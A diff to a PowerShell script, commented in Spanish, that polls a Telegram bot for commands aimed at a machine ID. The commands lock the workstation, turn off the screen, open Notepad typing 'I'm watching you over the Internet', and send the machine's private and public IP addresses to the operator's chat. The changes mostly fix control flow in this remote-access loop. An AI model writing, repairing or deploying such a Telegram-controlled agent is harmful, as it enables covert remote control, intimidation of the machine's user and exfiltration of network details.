@@ -96,31 +96,39 @@ while ($true) {
 
                 # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
-                    
-                    switch ($Comando) {
+                 
+                 switch ($Comando) {
+                 
                         "/pantalla_off" {
                             $rundll = New-Object -ComObject WScript.Shell
                             $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                             [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
+                            continue
                         }
+                        
                         "/pantalla_on" {
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("{SHIFT}")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
+                            continue
                         }
+                        
                         "/notepad" {
                             Start-Process "notepad.exe"
                             Start-Sleep -Milliseconds 500
                             $wsh = New-Object -ComObject WScript.Shell
                             $wsh.SendKeys("Te estoy observando por Internet... 👀")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
+                            continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
                         }
-                   "/red" {
+                        
+                        "/red" {
                             $IpPrivada = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
                             $IpPublica = "Desconocida"
                             try {
-                                $IpPublica = (Invoke-RestMethod -Uri "https://ipify.org" -TimeoutSec 5).Trim()
+                                # CORREGIDO: URL limpia de texto plano sin HTML visual externo
+                                $IpPublica = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
                             } catch {}
 
                             $ReporteRed = "📊 REPORTE DE RED (ID: " + $MiIDNum + ")`n" +
@@ -128,9 +136,9 @@ while ($true) {
                                           "🌍 IP Pública (Internet): " + $IpPublica
                                           
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
-                       continue
+                            continue # 👈 CORREGIDO: Posición ideal antes de cerrar la llave del comando
                         }
-                    }
+                    } # Cierre limpio del switch
                 }
             }
         }
@@ -139,3 +147,4 @@ while ($true) {
     }
     Start-Sleep -Seconds 2
 }
+
